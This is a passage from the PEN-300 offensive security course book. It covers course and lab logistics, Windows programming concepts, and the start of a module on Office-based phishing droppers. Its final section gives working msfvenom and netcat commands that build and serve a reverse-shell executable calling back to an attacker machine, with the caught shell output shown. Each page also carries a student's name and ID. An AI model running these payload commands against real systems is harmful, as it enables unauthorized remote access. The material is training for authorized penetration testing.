an internal system and can perform the attacks from there. In this type of test the focus is on the 
internal network. Additional information may be provided by the client to aid the test. 
A slightly more complex test is an external penetration test, which can leverage social engineering 
and attacks against internet facing infrastructure. 
Both types of penetration tests will attempt to compromise as much of the internal systems of 
the client organization as possible. This often includes attacking Active Directory and production 
systems. No matter how a penetration test is conducted, the overall goal is to test the security of 
client organizations IT infrastructure. 
Instead of testing the security of the IT infrastructure, it is possible to test the security response 
of the organization. This is typically called a red team test (red teaming) or adversary simulation 
and works by mimicking the techniques and procedures of advanced attackers. 
The main purpose of a red team test is to train or test the security personal in the client 
organization, which are referred to as the blue team. While many techniques between penetration 
tests and red team tests overlap, the goals are different. 
 
1 (Offensive Security, 2021), https://www.offensive-security.com/pwk-oscp/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
17 
PEN-300 will provide the knowledge and techniques required to perform advanced penetration 
tests against mature organizations with a developed security level. It is not a Red Team course. 
The topics covered in this course includes techniques such as client side code execution attacks, 
antivirus evasion, application whitelisting bypasses, and network detection bypasses. The second 
half of the course focuses on key concepts such as lateral movement, pivoting, and advanced 
attacks against Active Directory. 
Since PEN-300 is an advanced penetration testing course, we will generally not deal with the act 
of evading a blue team. Instead, we will focus on bypassing automated security mechanisms that 
block an attack. 
1.2 Provided Material 
Next let’s take a moment to review the individual components of the course. You should now 
have access to the following: 
• 
The PEN-300 course materials 
• 
Access to the PEN-300 VPN lab network 
• 
Student forum credentials 
• 
Live support 
• 
OSEP exam attempt/s 
Let’s review each of these items. 
1.2.1 PEN-300 Course Materials 
The course includes online book modules and the accompanying course videos. The information 
covered in the book modules and the videos are complementary, meaning you can read the book 
modules and then watch the videos to fill in any gaps or vice versa. 
In some modules, the the book modules is more detailed than the videos. In other cases, the 
videos may convey some information better than the book modules. It is important that you pay 
close attention to both. 
The book modules also contain exercises for each chapter. Completing the course exercises will 
help students solidify their knowledge and practice the skills needed to attack and compromise 
lab machines. 
1.2.2 Access to the PEN-300 VPN Lab Network 
Once you have signed up for the course, you will be able to download the VPN pack required to 
access the lab network via the course lab page in the Offsec Training Library. This will enable you 
to access the PWK VPN lab network, where you will be spending a considerable amount of time. 
Lab time starts when your course begins and is metered as continuous access. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
18 
If your lab time expires, or is about to expire, you can purchase a lab extension at any time. To 
purchase additional lab time, use the “Extend” link available at top right corner of the Offsec 
Training Library. If you purchase a lab extension while your lab access is still active, you can 
continue to use the same VPN connectivity pack. If you purchase a lab extension after your 
existing lab access has ended, you will need to download a new VPN connectivity pack via the 
course lab page in the Offsec Training Library. 
Students who have purchased a subscription will have access to the lab as long as the 
subscription is active. Your subscription will be automatically renewed, unless cancelled via the 
billing page. 
1.2.3 The Offensive Security Student Forum 
The Student Forum2 is only accessible to Offensive Security students. Access does not expire 
when your lab time ends. You can continue to enjoy the forums long after you pass your OSEP 
exam. 
On the forum, you can ask questions, share interesting resources, and offer tips (as long as there 
are no spoilers). We ask all forum members to be mindful of what they post, taking particular care 
not to ruin the overall course experience for others by posting complete solutions. Inappropriate 
posts may be moderated. 
Once you have successfully passed the OSEP exam, you will gain access to the sub-forum for 
certificate holders. 
1.2.4 Live Support and RocketChat 
Live Support3 can be accessed by clicking the “Connect to Discord” in the upper right hand corner 
of the Offsec Training Library. Live Support will allow you to directly communicate with our 
Student Administrators. 
Student Administrators are available to assist with technical issues, but they may also be able to 
clarify items in the course material and exercises. In addition, if you have tried your best and are 
completely stuck on a lab machine, Student Administrators may be able to provide a small hint to 
help you on your way. 
Remember that the information provided by the Student Administrators will be based on the 
amount of detail you are able to provide. The more detail you can give about what you’ve already 
tried and the outcomes you’ve been able to observe, the better. 
1.2.5 OSEP Exam Attempt 
Included with your initial purchase of the PEN-300 course is an attempt at the Offensive Security 
Experienced Penetration Tester (OSEP) certification. 
To book your OSEP exam, go to your exam scheduling calendar. The calendar can be located in 
the OffSec Training Library under the course exam page. Here you will be able to see your exam 
expiry date, as well as schedule the exam for your preferred date and time. 
 
2 (Offensive Security, 2021), https://forums.offensive-security.com 
3 (Offensive Security, 2021), https://support.offensive-security.com 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
19 
Keep in mind that you won’t be able to select a start time if the exam labs are full for that time 
period so we encourage you to schedule your exam as soon as possible. 
1.3 Overall Strategies for Approaching the Course 
Each student is unique, so there is no single best way to approach this course and materials. We 
want to encourage you to move through the course at your own comfortable pace. You’ll also 
need to apply time management skills to keep yourself on track. 
We recommend the following as a very general approach to the course materials: 1. Review all 
the information included in the resources provided after the registration process. 2. Review the 
course materials. 3. Complete the course exercises. 4. Attack the lab machines. 
1.3.1 Course Materials 
Once you have reviewed the information above, you can jump into the course material. You may 
opt to start with the course videos, and then review the information for that given module in the 
book modules or vice versa depending on your preferred learning style. As you go through the 
course material, you may need to re-watch or re-read modules to fully grasp the content. 
Note that all course modules except this introduction, Operating System and Programming Theory 
and Trying Harder: The Labs have course videos associated with them. 
In the book modules you will occasionally find text in red font which is centered. These blocks of 
text represent additional information provided for further context but is not required to 
understand to follow the narrative of an attack. Note that the information in these blocks is not 
mentioned in the course videos. 
We recommend treating the course like a marathon and not a sprint. Don’t be afraid to spend 
extra time with difficult concepts before moving forward in the course. 
1.3.2 Course Exercises 
We recommend that you fully complete the exercises for each module prior to moving on to the 
next module. They will test your understanding of the material and build your confidence to move 
forward. 
The time and effort it takes to complete these exercises may depend on your existing skillset. 
Please note that some exercises are difficult and may take a significant amount of time. We want 
to encourage you to be persistent, especially with tougher exercises. They are particularly helpful 
in developing that Offsec “Try Harder” mindset. 
Note that copy-pasting code from the book modules into a script or source code 
may include unintended whitespace or newlines due to formatting. 
Some modules will have extra mile exercises, which are more difficult and time-consuming than 
regular exercises. They are not required to learn the material but they will develop extra skills and 
aid you towards the exam. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
20 
1.4 About the PEN-300 VPN Labs 
The PEN-300 labs provide an isolated environment that contains two sets of machine types. The 
first type is the virtual machines associated with a given book module, while the other is the set of 
challenges presented once you have completed the course videos and the book modules. 
Note that all virtual machines in this course are assigned to you and are not shared with other 
students. 
1.4.1 Control Panel 
Once logged into the PEN-300 VPN lab network, you can access your PEN-300 control panel. The 
PEN-300 control panel will help you revert your client and lab machines or book your exam. 
1.4.2 Reverts 
Each student is provided with twelve reverts every 24 hours. Reverts enable you to return a 
particular set of lab machines to its pristine state. This counter is reset every day at 00:00 GMT 
+0. If you require additional reverts, you can contact a Student Administrator via email 
(help@offensive-security.com) or contact Live Support to have your revert counter reset. 
The minimum amount of time between lab machine reverts is five minutes. 
Each module (except this introduction and the modules Operating System and Programming 
Theory and Trying Harder: The Labs) will have an entry from a drop down menu. Before starting on 
the exercises or following the information given in the course videos or book modules you must 
access the control panel and revert the entry associated with the given module. 
Note that it is not possible to revert a single virtual machine for a given module or lab. When a 
revert is triggered all virtual machines for that given module are reverted. For modules later in the 
course this can take a while due to the number of machines in use. This is done to ensure stability 
of the lab machines within Active Directory environments. 
Once you have been disconnected from the VPN for an extended period any active virtual 
machines will be removed and once you connect to the VPN again you must request a revert. 
Therefore, please ensure that you copy any notes or developed scripts to your Kali Linux VM 
before disconnecting from the labs. 
After completing the course modules and associated exercises, you can select a number of 
challenges from the control panel. This will revert a set of machines used to simulate targets of a 
penetration test. Note that you will not be given any credentials for these clients as they simulate 
black box penetration tests. 
1.4.3 Client Machines 
For each module you will be assigned a set of dedicated client machines that are used in 
conjunction with the course material and exercises. 
The number and types of machines vary from module to module and it is not possible to have 
client machines from multiple modules active at the same time. Once a new module is selected 
any client machines from the current module are removed. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
21 
All machines used in this course have modern operating systems like Windows 10, Windows 
Server 2019, and Ubuntu 20.04. 
1.4.4 Kali Virtual Machine 
This course was created and designed with Kali Linux in mind. While you are free to use any 
operating system you desire, the book modules and course videos all depict commands as given 
in Kali Linux while running as a non-root user. 
Additionally the Student Administrators only provide support for Kali Linux running on VMware, 
but you are free to use any other virtualization software. 
The recommended Kali Linux image4 is the newest stable release in a default 64-bit build. 
1.4.5 Lab Behavior and Lab Restrictions 
The following restrictions are strictly enforced in the internal VPN lab network. If you violate any 
of the restrictions below, Offensive Security reserves the right to disable your lab access. 
1. 
Do not ARP spoof or conduct any other type of poisoning or man-in-the-middle attacks 
against the network. 
2. 
Do not perform brute force attacks against the VPN infrastructure. 
3. 
Do not attempt to hack into other students’ clients or Kali machines. 
1.5 About the OSEP Exam 
The OSEP certification exam simulates a live network in a private lab that contains a single large 
network to attack and compromise. To pass, you will need to either obtain access to a specific 
section of the network or obtain at least 100 points by compromising individual machines. 
The environment is completely dedicated to you for the duration of the exam, and you will have 
47 hours and 45 minutes to complete it. 
To ensure the integrity of our certifications, the exam will be remotely proctored. You are required 
to be present 15 minutes before your exam start time to perform identity verification and other 
pre-exam tasks. In order to do so, click on the Exam tab in the Offsec Training Library, which is 
situated at the top right of your screen. During these pre-exam verification steps, you will be 
provided with a VPN connectivity pack. 
Once the exam has ended, you will have an additional 24 hours to put together your exam report 
and document your findings. You will be evaluated on quality and accuracy of the exam report, so 
please include as much detail as possible and make sure your findings are all reproducible. 
Once your exam files have been accepted, your exam will be graded and you will receive your 
results in ten business days. If you achieve a passing score, we will ask you to confirm your 
physical address so we can mail your certificate. If you have not achieved a passing score, we will 
notify you, and you may purchase a certification retake using the appropriate links. 
 
4 (Offensive Security, 2021), https://www.kali.org/downloads/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
22 
We highly recommend that you carefully schedule your exam for a two day window when you can 
ensure no outside distractions or commitments. Also, please note that exam availability is 
handled on a first come, first served basis, so it is best to schedule your exam as far in advance 
as possible to ensure your preferred date is available. 
For additional information regarding the exam, we encourage you to take some time to go over 
the OSEP exam guide.5 
1.6 Wrapping Up 
In this module, we discussed important information needed to make the most of the PEN-300 
course and lab. In addition, we also covered how to take the final OSEP exam. 
We wish you the best of luck on your PEN-300 journey and hope you enjoy the new challenges 
you will face. 
 
5 (Offensive Security, 2021), https://help.offensive-security.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
23 
 
2 Operating System and Programming Theory 
Is programming required for penetration testing? 
This is a common question asked by newcomers to the security community. Our opinion is that a 
formal programming education is not required, but a broad knowledge of programming 
languages is extremely helpful. Armed with this broad knowledge, we better understand software 
vulnerabilities and general operating system concepts. 
This module will provide a theoretical approach to programming and Windows operating system 
concepts. It does not contain any exercises but does provide fundamental knowledge that we will 
rely on through this course. 
2.1 Programming Theory 
In the next few sections, we’ll present a high-level overview of programming and introduce 
important terms. 
2.1.1 Programming Language Level 
Programming encompasses many concepts, categorizations and hierarchies. In this section we’ll 
provide a general overview well-suited to penetration testing. 
All programming languages are either compiled6 or interpreted.7 When using a compiled language, 
code must be converted to binary (compiled) before it can be executed. On the other hand, when 
using an interpreted language, code files (scripts) are parsed and converted into the required 
binary format one line at a time when executed. 
The description above is not 100% accurate in relation to concepts as just-in-
time compilation and optimization but that is normally not relevant for us as 
penetration testers. 
In order to describe the hierarchy of programming languages we’ll focus on compiled languages 
and begin with a discussion of the lowest-level languages. 
Low-level programming languages are difficult for humans to understand, and are specifically tied 
to the hardware and contain a limited amount of features. On the other hand, high-level languages 
 
6 (Wikipedia, 2020), 
https://en.wikipedia.org/wiki/Compiled_language#:~:text=A%20compiled%20language%20is%20a,%2Druntime%20translation%20take
s%20place) 
7 (Wikipedia, 2020), 
https://en.wikipedia.org/wiki/Interpreted_language#:~:text=An%20interpreted%20language%20is%20a,program%20into%20machine%
2Dlanguage%20instructions. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
24 
are easier for programmers to read and write, are more portable and provide access to greater 
complexity through the paradigm of object-oriented programming.8 
At the very core, the CPU performs actions based on the opcodes9 stemming from the compiled 
code. An opcode is a binary value which the CPU maps to a specific action. The set of opcodes 
can be translated to the low level assembly10 programming language for better human readability. 
When we deal with Windows or Linux computers we typically concern ourselves with the x86 
architecture.11 The architecture defines which opcodes are valid and what functionality they map 
to in assembly. The same thing applies to other CPU architectures like ARM12 which is used with 
most smartphones and tablets. 
Applications that require low overhead and high efficiency such as the core components of an 
operating system or a browser typically have elements written in assembly. Although we will not 
often write assembly code as penetration testers, it can be helpful to understand it in order to 
perform various bypasses of security products or perform more advanced attacks. 
When we consider a language such as C,13 we are using a more human-readable syntax, even 
though C is still considered a relatively low-level language. By contrast, C++14 can be considered 
as both high and low-level. It still provides access to all the features of C and accepts directly 
embedded assembly code through inline assembly15 instructions. C++ also provides access to 
high-level features like classes and objects making it an object-oriented programming language. 
Most scripting languages like Python, JavaScript or PowerShell are high-level languages and make 
use of the object-oriented programming model as well. 
Code from lower level languages like C and C++ is converted to opcodes through 
the compilation process and executed directly by the CPU. Applications written in 
low-level languages must perform their own memory management, this is also 
referred to as unmanaged code.16 
Languages like Java17 and C#18 are also object-oriented programming languages but are vastly 
different in how they are compiled and execute. 
 
8 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Object-oriented_programming 
9 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Opcode 
10 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Assembly_language 
11 (Wikipedia, 2020), https://en.wikipedia.org/wiki/X86 
12 (Wikipedia, 2020), https://en.wikipedia.org/wiki/ARM_architecture 
13 (Wikipedia, 2020), https://en.wikipedia.org/wiki/C_(programming_language) 
14 (Wikipedia, 2020), https://en.wikipedia.org/wiki/C%2B%2B 
15 (Microsoft, 2018),https://docs.microsoft.com/en-us/cpp/assembler/inline/inline-assembler?view=vs-2019 
16 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Managed_code 
17 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Java_(programming_language) 
18 (Wikipedia, 2020), https://en.wikipedia.org/wiki/C_Sharp_(programming_language) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
25 
Code from Java and C# is compiled into bytecode19 which is then processed by an installed 
virtual machine. Java uses the Java Virtual Machine (JVM) which is part of the Java Runtime 
Environment (JRE). C# uses the Common Language Runtime20 (CLR), which is part of the .NET 
framework.21 
Web browsers typically execute code from scripting languages like JavaScript through a virtual 
machine as well. But when repetitive tasks are encountered a technique called just-in-time (JIT) 
compilation22 is employed where the script is compiled directly into native code. 
Java’s popularity largely stems from its operating system-independence, while C# has been 
primarily constrained to the Windows platform. With the relatively recent release of .NET Core23 
C# is also available on Linux or macOS. 
When the bytecode is executed, the virtual machine compiles it into opcodes which the CPU 
executes. 
When dealing with high-level languages, any code compiled into opcodes is often 
referred to as native code. Code produced by high-level languages that uses a 
virtual machine for execution is known as managed code. 
In this scenario, a virtual machine will often provide memory management support that can help 
prevent security vulnerabilities such as buffer overflows. 
Although it’s not critical to be able to program in each of these languages, as penetration testers 
we should at least understand their differences and limitations. 
2.1.2 Programming Concepts 
In this section we’ll discuss some basic concepts and terminology used in high-level language 
programming. 
A key component of object-oriented programming is a class24 which acts as a template for 
creating objects. Most classes contain a number of variables to store associated data and 
methods25 that can perform actions on the variables. 
In the Object-oriented paradigm, an object is instantiated26 from its class through a special 
method called constructor.27 Typically the constructor is named after its class and it’s mostly 
used to setup and initialize the instance variables of a class. 
 
19 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Bytecode 
20 (Microsoft, 2019), https://docs.microsoft.com/en-us/dotnet/standard/clr 
21 (Wikipedia, 2020), https://en.wikipedia.org/wiki/.NET_Framework 
22 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Just-in-time_compilation 
23 (Wikipedia, 2020), https://en.wikipedia.org/wiki/.NET_Core 
24 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Class_(computer_programming) 
25 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Method_(computer_programming) 
26 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Instance_(computer_science) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
26 
For example, in the listing below, when a MyClass object is instantiated, the MyClass constructor 
will setup and initialize the myNumber class variable to the value passed as a parameter to the 
constructor. 
public class MyClass 
{ 
    private int myNumber; 
 
    // constructor 
    public MyClass(int aNumber) 
    { 
        this.myNumber = aNumber; 
    } 
     
    public getNumber() 
    { 
      return myNumber; 
    } 
} 
Listing 1 - Class and constructor 
As noted in Listing 1, the name of class, method and variables are pre-pended by an access 
modifier.28 The two most common are public and private. The public modifier allows both code 
outside the class and inside the class to reference and use it, while private only allows code inside 
the class to access it. The same concept applies for methods. 
In Listing 1, all code can call the constructor MyClass, but only the instantiated object can 
reference the variable myNumber directly. Code outside the object has to call the public method 
getNumber to evaluate myNumber. 
As we begin developing attack techniques and begin to write custom code, these concepts and 
terms will become increasingly more important. In addition, we’ll rely on these concepts as we 
investigate and reverse-engineer high-level code. 
2.2 Windows Concepts 
Windows servers and workstations are ubiquitous in modern network environments. Let’s take 
some time to discuss some basic Windows-specific concepts and terminology that we will use 
throughout multiple modules in this course. 
2.2.1 Windows On Windows 
Most Windows-based machines use the 64-bit version of the Windows operating system. 
However, many applications are still 32-bit. 
 
27 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Constructor_(object-oriented_programming) 
28 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Access_modifiers 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
27 
To facilitate this, Microsoft introduced the concept of Windows On Windows 64-bit (WOW64)29 
which allows a 64-bit version of Windows to execute 32-bit applications with almost no loss of 
efficiency. 
Note that 64-bit Linux installations do not natively support 32-bit application 
execution. 
WOW64 utilizes four 64-bit libraries (Ntdll.dll, Wow64.dll, Wow64Win.dll and Wow64Cpu.dll) to 
emulate the execution of 32-bit code and perform translations between the application and the 
kernel. 
On 32-bit versions of Windows, most native Windows applications and libraries are stored in 
C:\Windows\System32. On 64-bit versions of Windows, 64-bit native programs and DLLs are 
stored in C:\Windows\System32 and 32-bit versions are stored in C:\Windows\SysWOW64. 
As penetration testers, we must remain aware of the architecture or bitness of our targets, since 
this dictates the type of shellcode and other compiled code that we can use. 
2.2.2 Win32 APIs 
The Windows operating system, and its various applications are written in a variety of 
programming languages ranging from assembly to C# but many of those make use of the 
Windows-provided built-in application programming interfaces (or APIs). 
These interfaces, known as the Win32 API,30 offer developers pre-built functionality. The APIs 
themselves are designed to be invoked from C and are documented with C-style data types but as 
we will discover throughout this course, they can be used with multiple other languages. 
Many of the Win32 APIs are documented by Microsoft. One simple example is the 
GetUserNameA31 API exported by Advapi32.dll which retrieves the name of the user executing the 
function. 
The syntax section of the documentation shows the function prototype32 that details the number 
and type of arguments along with the return type: 
BOOL GetUserNameA( 
  LPSTR   lpBuffer, 
  LPDWORD pcbBuffer 
); 
Listing 2 - Function prototype for GetUserNameA 
 
29 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/winprog64/wow64-implementation-details 
30 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Windows_API 
31 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-getusernamea 
32 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Function_prototype 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
28 
In this example, the API requires two arguments. The first is an output buffer of type LPSTR which 
is the Microsoft term for a character array. The second argument is a pointer to a DWORD which 
is a 32-bit unsigned integer. The return value from the API is a boolean. 
We will make extensive use of various Win32 APIs and their associated Microsoft data types33 
throughout this course. As we use these APIs we must keep in mind two particular details. First, 
we must determine if the process is 32-bit or 64-bit since some arguments and their size depend 
on the bitness. Second, we must distinguish between the use of ASCII34 and Unicode35 (which 
Microsoft sometimes refers to as UTF-1636). Since ASCII characters use one byte and Unicode 
uses at least two, many of the Win32 APIs are available in two distinct versions. 
Listing 2 above shows the prototype for GetUserNameA, where the suffix “A” indicates the ASCII 
version of the API. Listing 3 below shows the prototype for GetUserNameW, in which the “W” 
suffix (for “wide char”) indicates Unicode: 
BOOL GetUserNameW( 
  LPWSTR  lpBuffer, 
  LPDWORD pcbBuffer 
); 
Listing 3 - Function prototype 
The first argument type is now of type LPWSTR which is a UNICODE character array. 
We will be using the Win32 APIs extensively in this course. 
2.2.3 Windows Registry 
Many programming languages support the concept of local and global variables, where local 
variables are limited in scope and global variables are usable anywhere in the code. An operating 
system needs global variables in much the same manner. Windows uses the registry37 to store 
many of these. 
In this section, we’ll discuss the registry since it contains important information that can be 
abused during attacks, and some modifications may allow us to bypass specific defenses. 
The registry is effectively a database that consists of a massive number of keys with associated 
values. These keys are sorted hierarchically using subkeys. 
At the root, multiple registry hives38 contain logical divisions of registry keys. Information related 
to the current user is stored in the HKEY_CURRENT_USER (HKCU) hive, while information related 
to the operating system itself is stored in the HKEY_LOCAL_MACHINE (HKLM) hive. 
 
33 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types 
34 (Wikipedia, 2020), https://en.wikipedia.org/wiki/ASCII 
35 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Unicode 
36 (Wikipedia, 2020), https://en.wikipedia.org/wiki/UTF-16 
37 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Windows_Registry 
38 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
29 
 
The HKEY_CURRENT_USER hive is writable by the current user while 
modification of the HKEY_LOCAL_MACHINE hive requires administrative 
privileges. 
We can interface with the registry both programmatically through the Win32 APIs as well as 
through the GUI with tools like the Registry Editor (regedit) shown in Figure 1. 
 
Figure 1: Registry editor in Windows 
Figure 1 shows additional registry hives some of which we will explore in later modules. 
Since a 64-bit version of Windows can execute 32-bit applications each registry hive contains a 
duplicate section called Wow6432Node39 which stores the appropriate 32-bit settings. 
The registry is used extensively by the operating system and a variety of applications. As 
penetration testers, we can obtain various reconnaissance information from it or modify it to 
improve attacks or perform evasion. 
2.3 Wrapping Up 
This module provided a brief introduction to programming and a high-level overview of some 
important aspects of the Windows operating system. This extremely brief overview serves to 
prepare us for the techniques we will use and develop in this course. 
 
39 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
30 
 
3 Client Side Code Execution With Office 
There are typically two ways to gain unauthorized remote access to a system. The first is to 
exploit a vulnerable application or service that is exposed to the Internet. While this does not 
require victim interaction, the target must be running vulnerable software which we must target 
with an exploit. 
The second way to gain remote access is to trick a user into running malicious code. This 
technique typically requires that the victim interact with a file or an HTML web page in a browser. 
These types of attacks fall into the category of Social Engineering40 known as Phishing.41 While 
vulnerabilities in software may be discovered and patched, user behavior is much more difficult to 
correct, making this a particularly appealing attack vector and the primary focus of this module. 
In order to make this type of attack more effective, we will attempt to abuse features in software 
which the end user commonly uses and trust. Specifically, the goal of this module is to gain code 
execution through exploitation of Microsoft Office products. This is a common attack vector in 
both real-world attacks and in penetration tests. 
In this module, we will present various client-side attacks against the Microsoft Office Suite. While 
our ultimate goal is to gain code execution on the target, we will also discuss common attack 
scenarios and discuss payloads, shellcodes, and common command and control infrastructures. 
3.1 Will You Be My Dropper 
Let’s discuss real-world attack scenarios and describe how these concepts translate into a 
penetration test. 
To initiate a client-side attack, an attacker often delivers a Trojan42 (in the form of a script or 
document) to the victim and tricks them into executing it. Traditional trojans embed an entire 
payload, but more complex Dropper43 trojans rely on a staged payload with a Callback44 function 
that connects back to the attack machine to download the second stage. 
Once the code has been delivered, it may be written to the hard disk or run directly from memory. 
Either way, the objective of the code is to create a communication channel back to the attacker. 
The code which is run on the victim’s workstation is known by several (often synonymous) names 
including an Implant, Agent, Backdoor, or simply Malware. 
Once this code is executed on the client, it must connect to a “Command and control” or C245 
infrastructure in order to communicate back to the attacker. This code will contain the attacker’s 
hostname and domain name or IP address and will leverage an available network protocol such 
 
40 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Social_engineering_(security) 
41 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Phishing 
42 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Trojan_horse_(computing) 
43 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Dropper_(malware) 
44 (FireEye, 2013), https://www.fireeye.com/blog/threat-research/2013/04/malware-callbacks.html 
45 (Malware Patrol, 2018), https://www.malwarepatrol.net/command-control-servers-c2s-fundamentals/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
31 
as HTTP or HTTPS (which may simulate user activity) or DNS (which simulates common network 
activity). 
Although sophisticated attackers will leverage a C2 infrastructure in the real 
world, in this module we will simply communicate directly with the target. 
The Metasploit framework simplifies this process. 
3.1.1 Staged vs Non-staged Payloads 
Metasploit boasts an impressive library of payloads that can be formatted in many different 
ways. The framework includes both staged and non-staged payloads. 
For example, windows/shell_reverse_tcp is a simple non-staged reverse TCP shell payload. It 
contains all the code needed to open up a reverse command shell to an attacker’s machine. The 
payload itself is actually a number of assembly instructions, which when executed, call a number 
of Windows APIs that connect to the attacker’s C2 and exposes a cmd.exe command prompt. 
Staged payloads, such as windows/shell/reverse_tcp, contain a minimal amount of code that 
performs a callback, then retrieves any remaining code and executes it in the target’s memory. 
This slimmed-down payload does not take up as much memory as a non-staged payload, and 
may evade anti-virus programs. 
Note the difference in the delimiters used in the names of these payloads. Non-staged payloads 
use a _ and staged payloads use / respectively, as illustrated below. The payload’s description 
also indicates whether it is staged or non-staged. 
windows/x64/meterpreter_reverse_https    Connect back to attacker and spawn a 
Meterpreter shell 
windows/x64/meterpreter/reverse_https    Inject the meterpreter server DLL via the 
Reflective Dll Injection payload (staged x64). 
Listing 4 - Non-staged vs staged payload 
3.1.2 Building Our Droppers 
Once we choose a payload, we can build it using msfvenom.46 For example, let’s create a regular 
executable with a non-staged payload. First, we will set the payload with -p, and the attacking IP 
address and port with LHOST and LPORT. We’ll set the payload format to executable with -f and 
use -o to save the payload to the root of our Apache web server. This construction is identical for 
staged and non-staged payloads. 
kali@kali:~$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 
LPORT=444 -f exe -o /var/www/html/shell.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload 
[-] No arch selected, selecting arch: x86 from the payload 
No encoder or badchars specified, outputting raw payload 
Payload size: 324 bytes 
 
46 (Offensive Security, 2019), https://www.offensive-security.com/metasploit-unleashed/msfvenom/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
32 
Final size of exe file: 73802 bytes 
Saved as: /var/www/html/shell.exe 
 
kali@kali:~$ sudo service apache2 start 
Listing 5 - Generate Non-staged Metasploit reverse TCP shell 
With the payload saved to our Apache root directory and the server started, we can launch a 
Netcat listener on our Kali attack machine to receive the shell. 
We will listen for an incoming connection (-l), avoid DNS lookups (-n) and use verbose output (-
v). We’ll also use -p to specify the TCP port, which must match the port used when generating 
the msfvenom executable (as seen in Listing 6). 
kali@kali:~$ sudo nc -lnvp 444 
listening on [any] 444 ... 
Listing 6 - Setting up the Netcat listener 
With the listener ready, let’s open Microsoft Edge on the victim’s machine and browse the 
payload’s URL on our Kali Linux Apache server. We will be prompted to download the file. Once 
the file is downloaded, we’ll execute it, ignoring and accepting any warning messages. 
Within a few seconds, the reverse shell should open in our Netcat listener: 
kali@kali:~$ sudo nc -lnvp 444 
listening on [any] 444 ... 
connect to [192.168.119.120] from (UNKNOWN) [192.168.120.11] 49676 
Microsoft Windows [Version 10.0.17763.107] 
(c) 2018 Microsoft Corporation. All rights reserved. 
 
C:\Users\Offsec\Downloads> 
Listing 7 - Catching the reverse shell 
Let’s try another example, this time leveraging the power of Metasploit’s signature Meterpreter47 
payload. 
The full Meterpreter payload is powerful, but the non-staged version is quite large. In this example, 
we’ll create a staged version. This version will be more compact, and will execute in stages. The 
small first stage executes a callback function, which will retrieve the remaining code and execute 
it in memory. 
